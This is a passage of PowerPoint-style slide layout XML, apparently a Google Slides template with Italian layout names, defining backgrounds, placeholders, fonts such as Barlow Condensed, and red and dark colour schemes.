            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3B96D3F2-C26D-FD91-1E18-C357571427E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9020922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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{86393912-73FA-26A0-0E20-BAA652FCF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575121a9be_0_1:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5520D353-D796-3329-1028-F0DBBF4048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575121a9be_0_1:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E115FD8C-C295-214E-3396-2C2EDD8E69A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7005698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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{468101D0-04FA-7337-FB24-91A6951B25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575121a9be_0_1:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3F591E42-46A3-2A8F-1D38-E8025B879D5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575121a9be_0_1:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C826DB33-1E53-C9C3-5C95-FF7EB8A7607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6298087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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{366DE0C8-C8E7-5F76-CAB4-E3E1043DA3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575121a9be_0_1:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F785B3A2-6938-71DA-BCC3-BB82D7FFA27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575121a9be_0_1:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EB151C7A-E12B-80EA-9D8A-40B3A7B3B58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5031860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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{97C6A6AF-A01B-5E3B-F81B-949E028DA2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575121a9be_0_1:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{51C16E44-6EC6-B33F-A02B-CB02C3AE3F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575121a9be_0_1:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EDF8F337-7DE1-1854-0BAF-C04706A9197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1787728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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{57DB1149-E4CB-7FEB-1517-A551B50D5E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575121a9be_0_1:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C8E40AE6-B57F-54D0-2E2A-9F5C78E0705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575121a9be_0_1:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D39C2FD8-0122-5768-25A4-7929F52B936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3503168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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{396363CC-6970-756F-8E27-A63D8C9C13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575121a9be_0_1:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EED03EBF-A3D9-6DEF-6AAB-8E2AB042EB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575121a9be_0_1:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B000EADD-7EBA-DA44-F2BF-7D3CD8F675A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16102974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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{510FDA05-D309-794B-1448-C950019C57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575121a9be_0_1:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BE905B57-6C75-64D3-6882-D52B4468936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575121a9be_0_1:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C4159158-3C56-4FEE-6871-1301127D3F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54448130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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2987C4B5-9791-F752-496A-FC6655DF67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575121a9be_0_1:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F8B663E6-E656-660B-6988-A6EBAEC0231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575121a9be_0_1:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{922D83DA-FB1B-9827-9253-8F7E2FECC5B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98185214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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EA4F100C-6502-1DA7-F527-EE4879D6A1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575121a9be_0_1:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4A052EDC-7CCC-17E7-A4C4-DE1D157C03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575121a9be_0_1:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C940599D-779D-0574-000F-416EFD584DE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89692833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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{26ABB8DB-17A6-1859-2F61-9B5776819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18d9829d3aa_0_49:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DF8D77B4-7B1E-C71B-2553-7CEEF2B2F4D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18d9829d3aa_0_49:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{80186D76-62C8-4D3D-750D-DC379EE66D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77224992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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D9FDB905-8F82-4E87-CD82-1B5D5F6ADC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18d9829d3aa_0_49:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{30877F77-B7DE-DCF4-A73D-523B9E0B85F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18d9829d3aa_0_49:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4D374612-BA40-9FB0-D4BD-989FE5EB762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81729070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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{62815652-D1C9-7B05-6FB5-F5A00F08FE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18d9829d3aa_0_49:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{010A47B2-AFE4-35AE-5ED8-31C1AF0EEC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18d9829d3aa_0_49:notes">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{153DC11C-6B7E-B065-4E3E-E18BFB3BCDA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27412347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6d4d7e4f0f_5_1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6d4d7e4f0f_5_1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18d9829d3aa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18d9829d3aa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P Copertina" type="title">
  <p:cSld name="TITLE">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="D93232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311700" y="2679192"/>
            <a:ext cx="8520600" cy="538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362905" y="3296700"/>
            <a:ext cx="8520600" cy="50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Barlow Condensed Light"/>
              <a:buNone/>
              <a:defRPr sz="1600"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04950" y="1063225"/>
            <a:ext cx="2392550" cy="204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P Copertina Chiusura">
  <p:cSld name="TITLE_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="D93232"/>
        </a:solid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>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="2894224"/>
            <a:ext cx="8520600" cy="538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Barlow Condensed SemiBold"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:srgbClr val="FFFFFF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None/>
              <a:defRPr sz="5200">
                <a:solidFill>
                  <a:srgbClr val="000000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None/>
              <a:defRPr sz="5200">
                <a:solidFill>
                  <a:srgbClr val="000000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None/>
              <a:defRPr sz="5200">
                <a:solidFill>
                  <a:srgbClr val="000000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None/>
              <a:defRPr sz="5200">
                <a:solidFill>
                  <a:srgbClr val="000000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None/>
              <a:defRPr sz="5200">
                <a:solidFill>
                  <a:srgbClr val="000000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None/>
              <a:defRPr sz="5200">
                <a:solidFill>
                  <a:srgbClr val="000000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None/>
              <a:defRPr sz="5200">
                <a:solidFill>
                  <a:srgbClr val="000000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None/>
              <a:defRPr sz="52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pic>
        <p:nvPicPr>
          <p:cNvPr id="16" name="Google Shape;16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10075" y="1257757"/>
            <a:ext cx="2392550" cy="20491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" name="Google Shape;17;p3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4171000" y="4521000"/>
            <a:ext cx="802000" cy="145825"/>
            <a:chOff x="4171000" y="4521000"/>
            <a:chExt cx="802000" cy="145825"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="18" name="Google Shape;18;p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171000" y="4521000"/>
              <a:ext cx="145818" cy="1458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" name="Google Shape;19;p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389727" y="4521000"/>
              <a:ext cx="145818" cy="1458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" name="Google Shape;20;p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608455" y="4521000"/>
              <a:ext cx="145818" cy="1458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" name="Google Shape;21;p3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4827182" y="4521000"/>
              <a:ext cx="145818" cy="1458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2" name="Google Shape;22;p3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4136850" y="4136800"/>
            <a:ext cx="870300" cy="2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Barlow Condensed"/>
                <a:ea typeface="Barlow Condensed"/>
                <a:cs typeface="Barlow Condensed"/>
                <a:sym typeface="Barlow Condensed"/>
              </a:rPr>
              <a:t>FOLLOW US</a:t>
            </a:r>
            <a:endParaRPr sz="1200"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p - titolo sezione - 2 righe" type="secHead">
  <p:cSld name="SECTION_HEADER">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="111D24"/>
        </a:solidFill>
        <a:effectLst/>
      </p:bgPr>
    </p:bg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311700" y="2422208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D93232"/>
              </a:buClr>
              <a:buSzPts val="4000"/>
              <a:buNone/>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:srgbClr val="D9323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subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="504300" y="3194775"/>
            <a:ext cx="8135400" cy="56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FFFFFF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 sz="5000">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF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sz="5000">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF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sz="5000">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF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sz="5000">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF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sz="5000">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF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sz="5000">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF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sz="5000">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF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sz="5000">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF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p - titolo sezione - 1 riga">
  <p:cSld name="SECTION_HEADER_2">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="111D24"/>
        </a:solidFill>
        <a:effectLst/>
      </p:bgPr>
    </p:bg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 txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="2422208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ll for Feedback">
  <p:cSld name="SECTION_HEADER_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="D93232"/>
        </a:solidFill>
        <a:effectLst/>
      </p:bgPr>
    </p:bg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>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="248625" y="2645775"/>
            <a:ext cx="8520600" cy="45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None/>
              <a:defRPr sz="3200">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF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1" name="Google Shape;31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440600" y="4663222"/>
            <a:ext cx="262800" cy="3220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9" name="Google Shape;39;p8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0" name="Google Shape;40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details">
  <p:cSld name="TITLE_ONLY_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="lt1"/>
        </a:solidFill>
        <a:effectLst/>
      </p:bgPr>
    </p:bg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7" name="Google Shape;47;p10"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1201500"/>
            <a:ext cx="8520600" cy="346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Barlow Condensed"/>
              <a:buNone/>
              <a:defRPr sz="1800">
                <a:latin typeface="Barlow Condensed"/>
                <a:ea typeface="Barlow Condensed"/>
                <a:cs typeface="Barlow Condensed"/>
                <a:sym typeface="Barlow Condense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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="100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pic>
        <p:nvPicPr>
          <p:cNvPr id="48" name="Google Shape;48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440600" y="4663222"/>
            <a:ext cx="262800" cy="3220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ull code">
  <p:cSld name="TITLE_ONLY_1_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="111D24"/>
        </a:solidFill>
        <a:effectLst/>
      </p:bgPr>
    </p:bg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None/>
              <a:defRPr sz="3200"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2" name="Google Shape;52;p11"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1870387"/>
            <a:ext cx="8520600" cy="310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nonymous Pro"/>
              <a:buNone/>
              <a:defRPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Anonymous Pro"/>
                <a:ea typeface="Anonymous Pro"/>
                <a:cs typeface="Anonymous Pro"/>
                <a:sym typeface="Anonymous P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pic>
        <p:nvPicPr>
          <p:cNvPr id="53" name="Google Shape;53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440600" y="4663222"/>
            <a:ext cx="262800" cy="322059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11"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1473312"/>
            <a:ext cx="8433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Barlow Condensed SemiBold"/>
                <a:ea typeface="Barlow Condensed SemiBold"/>
                <a:cs typeface="Barlow Condensed SemiBold"/>
                <a:sym typeface="Barlow Condensed SemiBold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2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57" name="Google Shape;57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o logo">
  <p:cSld name="BLANK_1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5" name="Google Shape;65;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4357425" y="4532100"/>
            <a:ext cx="441600" cy="499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pic>
        <p:nvPicPr>
          <p:cNvPr id="66" name="Google Shape;66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5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="-5400000">
            <a:off x="6531100" y="2085650"/>
            <a:ext cx="4292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500"/>
              <a:buFont typeface="Barlow Condensed Light"/>
              <a:buNone/>
              <a:defRPr sz="2500">
                <a:solidFill>
                  <a:srgbClr val="999999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500"/>
              <a:buFont typeface="Barlow Condensed Light"/>
              <a:buNone/>
              <a:defRPr sz="2500">
                <a:solidFill>
                  <a:srgbClr val="999999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500"/>
              <a:buFont typeface="Barlow Condensed Light"/>
              <a:buNone/>
              <a:defRPr sz="2500">
                <a:solidFill>
                  <a:srgbClr val="999999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500"/>
              <a:buFont typeface="Barlow Condensed Light"/>
              <a:buNone/>
              <a:defRPr sz="2500">
                <a:solidFill>
                  <a:srgbClr val="999999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500"/>
              <a:buFont typeface="Barlow Condensed Light"/>
              <a:buNone/>
              <a:defRPr sz="2500">
                <a:solidFill>
                  <a:srgbClr val="999999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500"/>
              <a:buFont typeface="Barlow Condensed Light"/>
              <a:buNone/>
              <a:defRPr sz="2500">
                <a:solidFill>
                  <a:srgbClr val="999999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500"/>
              <a:buFont typeface="Barlow Condensed Light"/>
              <a:buNone/>
              <a:defRPr sz="2500">
                <a:solidFill>
                  <a:srgbClr val="999999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500"/>
              <a:buFont typeface="Barlow Condensed Light"/>
              <a:buNone/>
              <a:defRPr sz="2500">
                <a:solidFill>
                  <a:srgbClr val="999999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500"/>
              <a:buFont typeface="Barlow Condensed Light"/>
              <a:buNone/>
              <a:defRPr sz="2500">
                <a:solidFill>
                  <a:srgbClr val="999999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9pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="68" name="Google Shape;6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69500" y="4616172"/>
            <a:ext cx="262800" cy="322059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5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title" idx="2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o logo 1">
  <p:cSld name="BLANK_1_1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2" name="Google Shape;72;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4357425" y="4532100"/>
            <a:ext cx="441600" cy="499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pic>
        <p:nvPicPr>
          <p:cNvPr id="73" name="Google Shape;73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6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="-5400000">
            <a:off x="6531100" y="2085650"/>
            <a:ext cx="4292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500"/>
              <a:buFont typeface="Barlow Condensed Light"/>
              <a:buNone/>
              <a:defRPr sz="2500">
                <a:solidFill>
                  <a:srgbClr val="999999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500"/>
              <a:buFont typeface="Barlow Condensed Light"/>
              <a:buNone/>
              <a:defRPr sz="2500">
                <a:solidFill>
                  <a:srgbClr val="999999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500"/>
              <a:buFont typeface="Barlow Condensed Light"/>
              <a:buNone/>
              <a:defRPr sz="2500">
                <a:solidFill>
                  <a:srgbClr val="999999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500"/>
              <a:buFont typeface="Barlow Condensed Light"/>
              <a:buNone/>
              <a:defRPr sz="2500">
                <a:solidFill>
                  <a:srgbClr val="999999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500"/>
              <a:buFont typeface="Barlow Condensed Light"/>
              <a:buNone/>
              <a:defRPr sz="2500">
                <a:solidFill>
                  <a:srgbClr val="999999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500"/>
              <a:buFont typeface="Barlow Condensed Light"/>
              <a:buNone/>
              <a:defRPr sz="2500">
                <a:solidFill>
                  <a:srgbClr val="999999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500"/>
              <a:buFont typeface="Barlow Condensed Light"/>
              <a:buNone/>
              <a:defRPr sz="2500">
                <a:solidFill>
                  <a:srgbClr val="999999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500"/>
              <a:buFont typeface="Barlow Condensed Light"/>
              <a:buNone/>
              <a:defRPr sz="2500">
                <a:solidFill>
                  <a:srgbClr val="999999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500"/>
              <a:buFont typeface="Barlow Condensed Light"/>
              <a:buNone/>
              <a:defRPr sz="2500">
                <a:solidFill>
                  <a:srgbClr val="999999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9pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="75" name="Google Shape;7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69500" y="4616172"/>
            <a:ext cx="262800" cy="322059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6"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1637250" y="2374950"/>
            <a:ext cx="5773800" cy="3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D93232"/>
              </a:buClr>
              <a:buSzPts val="2800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:srgbClr val="D9323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D93232"/>
              </a:buClr>
              <a:buSzPts val="2800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:srgbClr val="D9323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D93232"/>
              </a:buClr>
              <a:buSzPts val="2800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:srgbClr val="D9323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D93232"/>
              </a:buClr>
              <a:buSzPts val="2800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:srgbClr val="D9323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D93232"/>
              </a:buClr>
              <a:buSzPts val="2800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:srgbClr val="D9323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D93232"/>
              </a:buClr>
              <a:buSzPts val="2800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:srgbClr val="D9323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D93232"/>
              </a:buClr>
              <a:buSzPts val="2800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:srgbClr val="D9323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D93232"/>
              </a:buClr>
              <a:buSzPts val="2800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:srgbClr val="D9323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D93232"/>
              </a:buClr>
              <a:buSzPts val="2800"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:srgbClr val="D93232"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77" name="Google Shape;77;p16"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1637250" y="2902375"/>
            <a:ext cx="5773800" cy="717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Barlow Condensed"/>
              <a:buNone/>
              <a:defRPr sz="1800">
                <a:latin typeface="Barlow Condensed"/>
                <a:ea typeface="Barlow Condensed"/>
                <a:cs typeface="Barlow Condensed"/>
                <a:sym typeface="Barlow Condense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1000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="100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esentazione business - cover">
  <p:cSld name="CUSTOM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489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7"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1673550" y="1997225"/>
            <a:ext cx="61290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D93232"/>
              </a:buClr>
              <a:buSzPts val="4000"/>
              <a:buNone/>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:srgbClr val="D9323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81" name="Google Shape;81;p17"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1673550" y="2769797"/>
            <a:ext cx="5851800" cy="56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FFFFFF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 sz="5000">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF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 sz="5000">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF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 sz="5000">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF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 sz="5000">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF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 sz="5000">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF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 sz="5000">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF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 sz="5000">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF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 sz="5000">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF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3 - 2">
  <p:cSld name="CUSTOM_2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641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3-2">
  <p:cSld name="CUSTOM_3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3997" cy="5143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">
  <p:cSld name="CUSTOM_4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3997" cy="5143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2">
  <p:cSld name="CUSTOM_5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3997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3">
  <p:cSld name="CUSTOM_6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4">
  <p:cSld name="CUSTOM_7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3997" cy="5143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5">
  <p:cSld name="CUSTOM_8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3997" cy="5143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6">
  <p:cSld name="CUSTOM_9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3997" cy="5143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6 1">
  <p:cSld name="CUSTOM_9_1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7">
  <p:cSld name="CUSTOM_10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2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arlow Condensed Medium"/>
              <a:buNone/>
              <a:defRPr sz="2800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Barlow Condensed Medium"/>
                <a:ea typeface="Barlow Condensed Medium"/>
                <a:cs typeface="Barlow Condensed Medium"/>
                <a:sym typeface="Barlow Condensed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93232"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Barlow Condensed"/>
              <a:buChar char="●"/>
              <a:defRPr sz="1800">
                <a:latin typeface="Barlow Condensed"/>
                <a:ea typeface="Barlow Condensed"/>
                <a:cs typeface="Barlow Condensed"/>
                <a:sym typeface="Barlow Condensed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D93232"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Barlow Condensed"/>
              <a:buChar char="○"/>
              <a:defRPr>
                <a:latin typeface="Barlow Condensed"/>
                <a:ea typeface="Barlow Condensed"/>
                <a:cs typeface="Barlow Condensed"/>
                <a:sym typeface="Barlow Condensed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D93232"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Barlow Condensed"/>
              <a:buChar char="■"/>
              <a:defRPr>
                <a:latin typeface="Barlow Condensed"/>
                <a:ea typeface="Barlow Condensed"/>
                <a:cs typeface="Barlow Condensed"/>
                <a:sym typeface="Barlow Condensed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D93232"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Barlow Condensed"/>
              <a:buChar char="●"/>
              <a:defRPr>
                <a:latin typeface="Barlow Condensed"/>
                <a:ea typeface="Barlow Condensed"/>
                <a:cs typeface="Barlow Condensed"/>
                <a:sym typeface="Barlow Condensed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D93232"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Barlow Condensed"/>
              <a:buChar char="○"/>
              <a:defRPr>
                <a:latin typeface="Barlow Condensed"/>
                <a:ea typeface="Barlow Condensed"/>
                <a:cs typeface="Barlow Condensed"/>
                <a:sym typeface="Barlow Condensed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D93232"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Barlow Condensed"/>
              <a:buChar char="■"/>
              <a:defRPr>
                <a:latin typeface="Barlow Condensed"/>
                <a:ea typeface="Barlow Condensed"/>
                <a:cs typeface="Barlow Condensed"/>
                <a:sym typeface="Barlow Condensed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D93232"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
